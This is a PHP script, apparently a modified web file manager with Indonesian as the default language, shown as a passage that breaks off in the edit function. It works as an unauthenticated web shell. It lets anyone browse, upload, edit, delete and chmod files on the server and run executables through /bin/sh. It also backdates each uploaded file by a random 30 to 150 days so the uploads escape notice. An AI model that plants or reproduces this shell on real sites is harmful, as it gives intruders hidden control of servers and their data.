<?php
/*
 * No Copyright (C) 
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 * -------------------------------------------------------------------------
 * While using this script, do NOT navigate with your browser's back and
 * forward buttons! Always open files in a new browser tab!
/* ------------------------------------------------------------------------- */

/* Your language:
 * 'en' - English
 * 'id' - Bahasa
 * 'auto' - autoselect
 */
$lang = 'id';

/* Homedir:
 * For example: './' - the script's directory
 */
$homedir = './';

/* Size of the edit textarea
 */
$editcols = 80;
$editrows = 25;


	
/* -------------------------------------------
 * Optional configuration (remove # to enable)
 */

/* Permission of created directories:
 * For example: 0705 would be 'drwx---r-x'.
 */
# $dirpermission = 0705;

/* Permission of created files:
 * For example: 0604 would be '-rw----r--'.
 */
# $filepermission = 0604;

/* Filenames related to the apache web server:
 */
$htaccess = '.htaccess';
$htpasswd = '.htpasswd';

/* ------------------------------------------------------------------------- */

if (get_magic_quotes_gpc()) {
	array_walk($_GET, 'strip');
	array_walk($_POST, 'strip');
	array_walk($_REQUEST, 'strip');
}

if (array_key_exists('image', $_GET)) {
	
	header('Content-Type: image/gif');
	die(getimage($_GET['image']));
}

if (!function_exists('lstat')) {
	function lstat ($filename) {
		return stat($filename);
	}
}

$delim = DIRECTORY_SEPARATOR;

if (function_exists('php_uname')) {
	$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
} else {
	$win = ($delim == '\\') ? true : false;
}

if (!empty($_SERVER['PATH_TRANSLATED'])) {
	$scriptdir = dirname($_SERVER['PATH_TRANSLATED']);
} elseif (!empty($_SERVER['SCRIPT_FILENAME'])) {
	$scriptdir = dirname($_SERVER['SCRIPT_FILENAME']);
} elseif (function_exists('getcwd')) {
	$scriptdir = getcwd();
} else {
	$scriptdir = '.';
}
$homedir = relative2absolute($homedir, $scriptdir);

$dir = (array_key_exists('dir', $_REQUEST)) ? $_REQUEST['dir'] : $homedir;

if (array_key_exists('olddir', $_POST) && !path_is_relative($_POST['olddir'])) {
	$dir = relative2absolute($dir, $_POST['olddir']);
	
}


$directory = simplify_path(addslash($dir));

$files = array();
$action = '';
if (!empty($_POST['submit_all'])) {
	$action = $_POST['action_all'];
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("checked$i", $_POST) && $_POST["checked$i"] == 'true') {
			$files[] = $_POST["file$i"];
		}
	}
} elseif (!empty($_REQUEST['action'])) {
	$action = $_REQUEST['action'];
	$files[] = relative2absolute($_REQUEST['file'], $directory);
} elseif (!empty($_POST['submit_upload']) && !empty($_FILES['upload']['name'])) {
	$files[] = $_FILES['upload'];
	$action = 'upload';
} elseif (array_key_exists('num', $_POST)) {
	for ($i = 0; $i < $_POST['num']; $i++) {
		if (array_key_exists("submit$i", $_POST)) break;
	}
	if ($i < $_POST['num']) {
		$action = $_POST["action$i"];
		$files[] = $_POST["file$i"];
	}
}
if (empty($action) && (!empty($_POST['submit_create']) || (array_key_exists('focus', $_POST) && $_POST['focus'] == 'create')) && !empty($_POST['create_name'])) {
	$files[] = relative2absolute($_POST['create_name'], $directory);
	switch ($_POST['create_type']) {
	case 'directory':
		$action = 'create_directory';
		break;
	case 'file':
		$action = 'create_file';
	}
}
if (sizeof($files) == 0) $action = ''; else $file = reset($files);

if ($lang == 'auto') {
	if (array_key_exists('HTTP_ACCEPT_LANGUAGE', $_SERVER) && strlen($_SERVER['HTTP_ACCEPT_LANGUAGE']) >= 2) {
		$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	} else {
		$lang = 'id';
	}
}

$words = getwords($lang);

if (isset($word_charset)) {
	$site_charset = $word_charset;
}

$cols = ($win) ? 4 : 7;

if (!isset($dirpermission)) {
	$dirpermission = (function_exists('umask')) ? (0777 & ~umask()) : 0755;
}
if (!isset($filepermission)) {
	$filepermission = (function_exists('umask')) ? (0666 & ~umask()) : 0644;
}

if (!empty($_SERVER['SCRIPT_NAME'])) {
	$self = html(basename($_SERVER['SCRIPT_NAME']));
} elseif (!empty($_SERVER['PHP_SELF'])) {
	$self = html(basename($_SERVER['PHP_SELF']));
} else {
	$self = '';
}

if (!empty($_SERVER['SERVER_SOFTWARE'])) {
	if (strtolower(substr($_SERVER['SERVER_SOFTWARE'], 0, 6)) == 'apache') {
		$apache = true;
	} else {
		$apache = false;
	}
} else {
	$apache = true;
}

switch ($action) {

case 'view':

	if (is_script($file)) {

		/* highlight_file is a mess! */
		ob_start();
		highlight_file($file);
		$src = preg_replace('<font color="([^"]*)">', '<span style="color: \1">', ob_get_contents());
		$src = str_replace(array('</font>', "\r", "\n"), array('</span>', '', ''), $src);
		ob_end_clean();

		html_header();
		echo '<h2 style="text-align: left; margin-bottom: 0">' . html($file) . '</h2>

<hr />

<table>
<tr>
<td style="text-align: right; vertical-align: top; color: gray; padding-right: 3pt; border-right: 1px solid gray">
<pre style="margin-top: 0"><code>';

		for ($i = 1; $i <= sizeof(file($file)); $i++) echo "$i\n";

		echo '</code></pre>
</td>
<td style="text-align: left; vertical-align: top; padding-left: 3pt">
<pre style="margin-top: 0">' . $src . '</pre>
</td>
</tr>
</table>

';

		html_footer();

	} else {

		header('Content-Type: ' . getmimetype($file));
		header('Content-Disposition: filename=' . basename($file));

		readfile($file);

	}

	break;

case 'download':

	header('Pragma: public');
	header('Expires: 0');
	header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	header('Content-Type: ' . getmimetype($file));
	header('Content-Disposition: attachment; filename=' . basename($file) . ';');
	header('Content-Length: ' . filesize($file));

	readfile($file);

	break;

case 'upload':

	$dest = relative2absolute($file['name'], $directory);

	if (@file_exists($dest)) {
		listing_page(error('already_exists', $dest));
	} elseif (@move_uploaded_file($file['tmp_name'], $dest)) {
		@chmod($dest, $filepermission);
		@touch($dest,strtotime('-'.rand(30,150).' days', time()));
		listing_page(notice('uploaded', $file['name']));
	} else {
		listing_page(error('not_uploaded', $file['name']));
	}

	break;

case 'create_directory':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$dirpermission);
		if (@mkdir($file, $dirpermission)) {
			listing_page(notice('created', $file));
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'create_file':

	if (@file_exists($file)) {
		listing_page(error('already_exists', $file));
	} else {
		$old = @umask(0777 & ~$filepermission);
		if (@touch($file)) {
			edit($file);
		} else {
			listing_page(error('not_created', $file));
		}
		@umask($old);
	}

	break;

case 'execute':

	chdir(dirname($file));

	$output = array();
	$retval = 0;
	exec('echo "./' . basename($file) . '" | /bin/sh', $output, $retval);

	$error = ($retval == 0) ? false : true;

	if (sizeof($output) == 0) $output = array('<' . $words['no_output'] . '>');

	if ($error) {
		listing_page(error('not_executed', $file, implode("\n", $output)));
	} else {
		listing_page(notice('executed', $file, implode("\n", $output)));
	}

	break;

case 'delete':

	if (!empty($_POST['no'])) {
		listing_page();
	} elseif (!empty($_POST['yes'])) {

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			if (del($file)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_deleted', implode("\n", $failure));
		}
		if (sizeof($success) > 0) {
			$message .= notice('deleted', implode("\n", $success));
		}

		listing_page($message);

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">
<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\t<b>" . word('really_delete') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	<input type="submit" name="no" value="' . word('no') . '" id="red_button" />
	<input type="submit" name="yes" value="' . word('yes') . '" id="green_button" style="margin-left: 50px" />
</td>
</tr>
</table>
</form>

';

		html_footer();

	}

	break;

case 'rename':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (!@file_exists($dest) && @rename($file, $dest)) {
			listing_page(notice('renamed', $file, $dest));
		} else {
			listing_page(error('not_renamed', $file, $dest));
		}

	} else {

		$name = basename($file);

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
	<input type="hidden" name="action" value="rename" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<b>' . word('rename_file') . '</b>
	<p>' . html($file) . '</p>
	<b>' . substr($file, 0, strlen($file) - strlen($name)) . '</b>
	<input type="text" name="destination" size="' . textfieldsize($name) . '" value="' . html($name) . '" />
	<hr />
	<input type="submit" value="' . word('rename') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'move':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		$failure = array();
		$success = array();

		foreach ($files as $file) {
			$filename = substr($file, strlen($directory));
			$d = $dest . $filename;
			if (!@file_exists($d) && @rename($file, $d)) {
				$success[] = $file;
			} else {
				$failure[] = $file;
			}
		}

		$message = '';
		if (sizeof($failure) > 0) {
			$message = error('not_moved', implode("\n", $failure), $dest);
		}
		if (sizeof($success) > 0) {
			$message .= notice('moved', implode("\n", $success), $dest);
		}

		listing_page($message);

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\t<b>" . word('move_files') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('move') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'copy':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (@is_dir($dest)) {

			$failure = array();
			$success = array();

			foreach ($files as $file) {
				$filename = substr($file, strlen($directory));
				$d = addslash($dest) . $filename;
				if (!@is_dir($file) && !@file_exists($d) && @copy($file, $d)) {
					$success[] = $file;
				} else {
					$failure[] = $file;
				}
			}

			$message = '';
			if (sizeof($failure) > 0) {
				$message = error('not_copied', implode("\n", $failure), $dest);
			}
			if (sizeof($success) > 0) {
				$message .= notice('copied', implode("\n", $success), $dest);
			}

			listing_page($message);

		} else {

			if (!@file_exists($dest) && @copy($file, $dest)) {
				listing_page(notice('copied', $file, $dest));
			} else {
				listing_page(error('not_copied', $file, $dest));
			}

		}

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">
';

		request_dump();

		echo "\n<b>" . word('copy_files') . '</b>
	<p>
';

		foreach ($files as $file) {
			echo "\t" . html($file) . "<br />\n";
		}

		echo '	</p>
	<hr />
	' . word('destination') . ':
	<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
	<input type="submit" value="' . word('copy') . '" />
</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'create_symlink':

	if (!empty($_POST['destination'])) {

		$dest = relative2absolute($_POST['destination'], $directory);

		if (substr($dest, -1, 1) == $delim) $dest .= basename($file);

		if (!empty($_POST['relative'])) $file = absolute2relative(addslash(dirname($dest)), $file);

		if (!@file_exists($dest) && @symlink($file, $dest)) {
			listing_page(notice('symlinked', $file, $dest));
		} else {
			listing_page(error('not_symlinked', $file, $dest));
		}

	} else {

		html_header();

		echo '<form action="' . $self . '" method="post">

<table class="dialog" id="symlink">
<tr>
	<td style="vertical-align: top">' . word('destination') . ': </td>
	<td>
		<b>' . html($file) . '</b><br />
		<input type="checkbox" name="relative" value="yes" id="checkbox_relative" checked="checked" style="margin-top: 1ex" />
		<label for="checkbox_relative">' . word('relative') . '</label>
		<input type="hidden" name="action" value="create_symlink" />
		<input type="hidden" name="file" value="' . html($file) . '" />
		<input type="hidden" name="dir" value="' . html($directory) . '" />
	</td>
</tr>
<tr>
	<td>' . word('symlink') . ': </td>
	<td>
		<input type="text" name="destination" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" />
		<input type="submit" value="' . word('create_symlink') . '" />
	</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

case 'edit':

	if (!empty($_POST['save'])) {

		$content = str_replace("\r\n", "\n", $_POST['content']);

		if (($f = @fopen($file, 'w')) && @fwrite($f, $content) !== false && @fclose($f)) {
			listing_page(notice('saved', $file));
		} else {
			listing_page(error('not_saved', $file));
		}

	} else {

		if (@is_readable($file) && @is_writable($file)) {
			edit($file);
		} else {
			listing_page(error('not_edited', $file));
		}

	}

	break;

case 'permission':

	if (!empty($_POST['set'])) {

		$mode = 0;
		if (!empty($_POST['ur'])) $mode |= 0400; if (!empty($_POST['uw'])) $mode |= 0200; if (!empty($_POST['ux'])) $mode |= 0100;
		if (!empty($_POST['gr'])) $mode |= 0040; if (!empty($_POST['gw'])) $mode |= 0020; if (!empty($_POST['gx'])) $mode |= 0010;
		if (!empty($_POST['or'])) $mode |= 0004; if (!empty($_POST['ow'])) $mode |= 0002; if (!empty($_POST['ox'])) $mode |= 0001;

		if (@chmod($file, $mode)) {
			listing_page(notice('permission_set', $file, decoct($mode)));
		} else {
			listing_page(error('permission_not_set', $file, decoct($mode)));
		}

	} else {

		html_header();

		$mode = fileperms($file);

		echo '<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">

	<p style="margin: 0">' . phrase('permission_for', $file) . '</p>

	<hr />

	<table id="permission">
	<tr>
		<td></td>
		<td style="border-right: 1px solid black">' . word('owner') . '</td>
		<td style="border-right: 1px solid black">' . word('group') . '</td>
		<td>' . word('other') . '</td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('read') . ':</td>
		<td><input type="checkbox" name="ur" value="1"'; if ($mode & 00400) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gr" value="1"'; if ($mode & 00040) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="or" value="1"'; if ($mode & 00004) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('write') . ':</td>
		<td><input type="checkbox" name="uw" value="1"'; if ($mode & 00200) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gw" value="1"'; if ($mode & 00020) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ow" value="1"'; if ($mode & 00002) echo ' checked="checked"'; echo ' /></td>
	</tr>
	<tr>
		<td style="text-align: right">' . word('execute') . ':</td>
		<td><input type="checkbox" name="ux" value="1"'; if ($mode & 00100) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="gx" value="1"'; if ($mode & 00010) echo ' checked="checked"'; echo ' /></td>
		<td><input type="checkbox" name="ox" value="1"'; if ($mode & 00001) echo ' checked="checked"'; echo ' /></td>
	</tr>
	</table>

	<hr />

	<input type="submit" name="set" value="' . word('set') . '" />

	<input type="hidden" name="action" value="permission" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />

</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

		html_footer();

	}

	break;

default:

	listing_page();

}

/* ------------------------------------------------------------------------- */

function getlist ($directory) {
	global $delim, $win;

	if ($d = @opendir($directory)) {

		while (($filename = @readdir($d)) !== false) {

			$path = $directory . $filename;

			if ($stat = @lstat($path)) {

				$file = array(
					'filename'    => $filename,
					'path'        => $path,
					'is_file'     => @is_file($path),
					'is_dir'      => @is_dir($path),
					'is_link'     => @is_link($path),
					'is_readable' => @is_readable($path),
					'is_writable' => @is_writable($path),
					'size'        => $stat['size'],
					'permission'  => $stat['mode'],
					'owner'       => $stat['uid'],
					'group'       => $stat['gid'],
					'mtime'       => @filemtime($path),
					'atime'       => @fileatime($path),
					'ctime'       => @filectime($path)
				);

				if ($file['is_dir']) {
					$file['is_executable'] = @file_exists($path . $delim . '.');
				} else {
					if (!$win) {
						$file['is_executable'] = @is_executable($path);
					} else {
						$file['is_executable'] = true;
					}
				}

				if ($file['is_link']) $file['target'] = @readlink($path);

				if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
				if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));

				$files[] = $file;

			}

		}

		return $files;

	} else {
		return false;
	}

}

function sortlist ($list, $key, $reverse) {

	$dirs = array();
	$files = array();
	
	for ($i = 0; $i < sizeof($list); $i++) {
		if ($list[$i]['is_dir']) $dirs[] = $list[$i];
		else $files[] = $list[$i];
	}

	quicksort($dirs, 0, sizeof($dirs) - 1, $key);
	if ($reverse) $dirs = array_reverse($dirs);

	quicksort($files, 0, sizeof($files) - 1, $key);
	if ($reverse) $files = array_reverse($files);

	return array_merge($dirs, $files);

}

function quicksort (&$array, $first, $last, $key) {

	if ($first < $last) {

		$cmp = $array[floor(($first + $last) / 2)][$key];

		$l = $first;
		$r = $last;

		while ($l <= $r) {

			while ($array[$l][$key] < $cmp) $l++;
			while ($array[$r][$key] > $cmp) $r--;

			if ($l <= $r) {

				$tmp = $array[$l];
				$array[$l] = $array[$r];
				$array[$r] = $tmp;

				$l++;
				$r--;

			}

		}

		quicksort($array, $first, $r, $key);
		quicksort($array, $l, $last, $key);

	}

}

function permission_octal2string ($mode) {

	if (($mode & 0xC000) === 0xC000) {
		$type = 's';
	} elseif (($mode & 0xA000) === 0xA000) {
		$type = 'l';
	} elseif (($mode & 0x8000) === 0x8000) {
		$type = '-';
	} elseif (($mode & 0x6000) === 0x6000) {
		$type = 'b';
	} elseif (($mode & 0x4000) === 0x4000) {
		$type = 'd';
	} elseif (($mode & 0x2000) === 0x2000) {
		$type = 'c';
	} elseif (($mode & 0x1000) === 0x1000) {
		$type = 'p';
	} else {
		$type = '?';
	}

	$owner  = ($mode & 00400) ? 'r' : '-';
	$owner .= ($mode & 00200) ? 'w' : '-';
	if ($mode & 0x800) {
		$owner .= ($mode & 00100) ? 's' : 'S';
	} else {
		$owner .= ($mode & 00100) ? 'x' : '-';
	}

	$group  = ($mode & 00040) ? 'r' : '-';
	$group .= ($mode & 00020) ? 'w' : '-';
	if ($mode & 0x400) {
		$group .= ($mode & 00010) ? 's' : 'S';
	} else {
		$group .= ($mode & 00010) ? 'x' : '-';
	}

	$other  = ($mode & 00004) ? 'r' : '-';
	$other .= ($mode & 00002) ? 'w' : '-';
	if ($mode & 0x200) {
		$other .= ($mode & 00001) ? 't' : 'T';
	} else {
		$other .= ($mode & 00001) ? 'x' : '-';
	}

	return $type . $owner . $group . $other;

}

function is_script ($filename) {
	return preg_match('\.php$|\.php3$|\.php4$|\.php5$|\.php7$', $filename);
}

function getmimetype ($filename) {
	static $mimes = array(
		'\.jpg$|\.jpeg$'  => 'image/jpeg',
		'\.gif$'          => 'image/gif',
		'\.png$'          => 'image/png',
		'\.html$|\.html$' => 'text/html',
		'\.txt$|\.asc$'   => 'text/plain',
		'\.xml$|\.xsl$'   => 'application/xml',
		'\.pdf$'          => 'application/pdf'
	);

	foreach ($mimes as $regex => $mime) {
		if (preg_match($regex, $filename)) return $mime;
	}

	// return 'application/octet-stream';
	return 'text/plain';

}

function del ($file) {
	global $delim;

	if (!file_exists($file)) return false;

	if (@is_dir($file) && !@is_link($file)) {

		$success = false;

		if (@rmdir($file)) {

			$success = true;

		} elseif ($dir = @opendir($file)) {

			$success = true;

			while (($f = readdir($dir)) !== false) {
				if ($f != '.' && $f != '..' && !del($file . $delim . $f)) {
					$success = false;
				}
			}
			closedir($dir);

			if ($success) $success = @rmdir($file);

		}

		return $success;

	}

	return @unlink($file);

}

function addslash ($directory) {
	global $delim;

	if (substr($directory, -1, 1) != $delim) {
		return $directory . $delim;
	} else {
		return $directory;
	}

}

function relative2absolute ($string, $directory) {

	if (path_is_relative($string)) {
		return simplify_path(addslash($directory) . $string);
	} else {
		return simplify_path($string);
	}

}

function path_is_relative ($path) {
	global $win;

	if ($win) {
		return (substr($path, 1, 1) != ':');
	} else {
		return (substr($path, 0, 1) != '/');
	}

}

function absolute2relative ($directory, $target) {
	global $delim;

	$path = '';
	while ($directory != $target) {
		if ($directory == substr($target, 0, strlen($directory))) {
			$path .= substr($target, strlen($directory));
			break;
		} else {
			$path .= '..' . $delim;
			$directory = substr($directory, 0, strrpos(substr($directory, 0, -1), $delim) + 1);
		}
	}
	if ($path == '') $path = '.';

	return $path;

}

function simplify_path ($path) {
	global $delim;

	if (@file_exists($path) && function_exists('realpath') && @realpath($path) != '') {
		$path = realpath($path);
		if (@is_dir($path)) {
			return addslash($path);
		} else {
			return $path;
		}
	}

	$pattern  = $delim . '.' . $delim;

	if (@is_dir($path)) {
		$path = addslash($path);
	}

	while (strpos($path, $pattern) !== false) {
		$path = str_replace($pattern, $delim, $path);
	}

	$e = addslashes($delim);
	$regex = $e . '((\.[^\.' . $e . '][^' . $e . ']*)|(\.\.[^' . $e . ']+)|([^\.][^' . $e . ']*))' . $e . '\.\.' . $e;

	while (preg_match($regex, $path)) {
		$path = preg_replace($regex, $delim, $path);
	}
	
	return $path;

}

function human_filesize ($filesize) {

	$suffices = 'kMGTPE';

	$n = 0;
	while ($filesize >= 1000) {
		$filesize /= 1024;
		$n++;
	}

	$filesize = round($filesize, 3 - strpos($filesize, '.'));

	if (strpos($filesize, '.') !== false) {
		while (in_array(substr($filesize, -1, 1), array('0', '.'))) {
			$filesize = substr($filesize, 0, strlen($filesize) - 1);
		}
	}

	$suffix = (($n == 0) ? '' : substr($suffices, $n - 1, 1));

	return $filesize . " {$suffix}B";

}

function strip (&$str) {
	$str = stripslashes($str);
}

/* ------------------------------------------------------------------------- */

function listing_page ($message = null) {
	global $self, $directory, $sort, $reverse;

	html_header();

	$list = getlist($directory);

	if (array_key_exists('sort', $_GET)) $sort = $_GET['sort']; else $sort = 'filename';
	if (array_key_exists('reverse', $_GET) && $_GET['reverse'] == 'true') $reverse = true; else $reverse = false;

	echo '

<form enctype="multipart/form-data" action="' . $self . '" method="post">

<table id="main">
';

	directory_choice();

	if (!empty($message)) {
		spacer();
		echo $message;
	}

	if (@is_writable($directory)) {
		create_box();
		upload_box();
	} else {
		spacer();
	}

	if ($list) {
		$list = sortlist($list, $sort, $reverse);
		listing($list);
	} else {
		echo error('not_readable', $directory);
	}

	echo '</table>

</form>

';

	html_footer();

}

function listing ($list) {
	global $directory, $homedir, $sort, $reverse, $win, $cols, $date_format, $self;

	echo '<tr class="listing">
	<th style="text-align: center; vertical-align: middle"><img src="' . $self . '?image=smiley" alt="smiley" /></th>
';

	column_title('filename', $sort, $reverse);
	column_title('size', $sort, $reverse);

	if (!$win) {
		column_title('permission', $sort, $reverse);
		column_title('owner', $sort, $reverse);
		column_title('group', $sort, $reverse);
	}

	echo '	<th class="functions">' . word('functions') . '</th>
</tr>
';

	for ($i = 0; $i < sizeof($list); $i++) {
		$file = $list[$i];

		$timestamps  = 'Modified: ' . date($date_format, $file['mtime']) . ', ';
		$timestamps .= 'Accessed: ' . date($date_format, $file['atime']) . ', ';
		$timestamps .= 'Created: ' . date($date_format, $file['ctime']);

		echo '<tr class="listing">
	<td class="checkbox"><input type="checkbox" name="checked' . $i . '" value="true" onfocus="activate(\'other\')" /></td>
	<td class="filename" title="' . html($timestamps) . '">';

		if ($file['is_link']) {

			echo '<img src="' . $self . '?image=link" alt="link" /> ';
			echo html($file['filename']) . ' &rarr; ';

			$real_file = relative2absolute($file['target'], $directory);
			

			if (@is_readable($real_file)) {
				if (@is_dir($real_file)) {
					echo '[ <a href="' . $self . '?dir=' . urlencode($real_file) . '">' . html($file['target']) . '</a> ]';
				} else {
					echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($real_file) . '">' . html($file['target']) . '</a>';
				}
			} else {
				echo html($file['target']);
			}

		} elseif ($file['is_dir']) {

			echo '<img src="' . $self . '?image=folder" alt="folder" /> [ ';
			if ($win || $file['is_executable']) {
				echo '<a href="' . $self . '?dir=' . urlencode($file['path']) . '">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}
			echo ' ]';

		} else {

			if (substr($file['filename'], 0, 1) == '.') {
				echo '<img src="' . $self . '?image=hidden_file" alt="hidden file" /> ';
			} else {
				echo '<img src="' . $self . '?image=file" alt="file" /> ';
			}

			if ($file['is_file'] && $file['is_readable']) {
			   echo '<a href="' . $self . '?action=view&amp;file=' . urlencode($file['path']) . '" target="_blank">' . html($file['filename']) . '</a>';
			} else {
				echo html($file['filename']);
			}

		}

		if ($file['size'] >= 1000) {
			$human = ' title="' . human_filesize($file['size']) . '"';
		} else {
			$human = '';
		}

		echo "</td>\n";

		echo "\t<td class=\"size\"$human>{$file['size']} B</td>\n";

		if (!$win) {

			echo "\t<td class=\"permission\" title=\"" . decoct($file['permission']) . '">';

			$l = !$file['is_link'] && (!function_exists('posix_getuid') || $file['owner'] == posix_getuid());
			if ($l) echo '<a href="' . $self . '?action=permission&amp;file=' . urlencode($file['path']) . '&amp;dir=' . urlencode($directory) . '">';
			echo html(permission_octal2string($file['permission']));
			if ($l) echo '</a>';

			echo "</td>\n";

			if (array_key_exists('owner_name', $file)) {
				echo "\t<td class=\"owner\" title=\"uid: {$file['owner']}\">{$file['owner_name']}</td>\n";
			} else {
				echo "\t<td class=\"owner\">{$file['owner']}</td>\n";
			}

			if (array_key_exists('group_name', $file)) {
				echo "\t<td class=\"group\" title=\"gid: {$file['group']}\">{$file['group_name']}</td>\n";
			} else {
				echo "\t<td class=\"group\">{$file['group']}</td>\n";
			}

		}

		echo '	<td class="functions">
		<input type="hidden" name="file' . $i . '" value="' . html($file['path']) . '" />
';

		$actions = array();
		if ($file['is_file'] && $file['is_readable']) {
		    if ($file['is_writable']) $actions[] = 'edit';
			$actions[] = 'copy';
			$actions[] = 'download';
			
		}		
		if (@is_writable(dirname($file['path']))) {
			$actions[] = 'delete';
			$actions[] = 'rename';
			$actions[] = 'move';
		}		
		if (function_exists('symlink')) {
			$actions[] = 'create_symlink';
		}

		if (!$win && function_exists('exec') && $file['is_file'] && $file['is_executable'] && file_exists('/bin/sh')) {
			$actions[] = 'execute';
		}

		if (sizeof($actions) > 0) {

			echo '		<select class="small" name="action' . $i . '" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';

			foreach ($actions as $action) {
				echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
			}

			echo '		</select>
		<input class="small" type="submit" name="submit' . $i . '" value=" &gt; " onfocus="activate(\'other\')" />
';

		}

		echo '	</td>
</tr>
';

	}

	echo '<tr class="listing_footer">
	<td style="text-align: right; vertical-align: top"><img src="' . $self . '?image=arrow" alt="&gt;" /></td>
	<td colspan="' . ($cols - 1) . '">
		<input type="hidden" name="num" value="' . sizeof($list) . '" />
		<input type="hidden" name="focus" value="" />
		<input type="hidden" name="olddir" value="' . html($directory) . '" />
';

	$actions = array();
	if (@is_writable(dirname($file['path']))) {
		$actions[] = 'delete';
		$actions[] = 'move';
	}
	$actions[] = 'copy';

	echo '		<select class="small" name="action_all" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';

	foreach ($actions as $action) {
		echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
	}

	echo '		</select>
		<input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" />
	</td>
</tr>
';

}

function column_title ($column, $sort, $reverse) {
	global $self, $directory;

	$d = 'dir=' . urlencode($directory) . '&amp;';

	$arr = '';
	if ($sort == $column) {
		if (!$reverse) {
			$r = '&amp;reverse=true';
			$arr = ' &and;';
		} else {
			$arr = ' &or;';
		}
	} else {
		$r = '';
	}
	echo "\t<th class=\"$column\"><a href=\"$self?{$d}sort=$column$r\">" . word($column) . "</a>$arr</th>\n";

}

function directory_choice () {
	global $directory, $homedir, $cols, $self;

	echo '<tr>
	<td colspan="' . $cols . '" id="directory">
		<a href="' . $self . '?dir=' . urlencode($homedir) . '">' . word('directory') . '</a>:
		<input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" />
		<input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" /><div style="float:right"><a href="?">x&sup1;&sup2;&sup3;</a></div>
	</td>
</tr>
';

}

function upload_box () {
	global $cols;

	echo '
		' . word('file') . ':
		<input type="file" name="upload" onfocus="activate(\'other\')" />
		<input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" />
	</td>
</tr>
';

}

function create_box () {
	global $cols;

	echo '<tr>
	<td colspan="' . $cols . '" id="create">
		<select name="create_type" size="1" onfocus="activate(\'create\')">
		<option value="file">' . word('file') . '</option>
		<option value="directory">' . word('directory') . '</option>
		</select>
		<input type="text" name="create_name" onfocus="activate(\'create\')" />
		<input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" />

';

}

function edit ($file) {
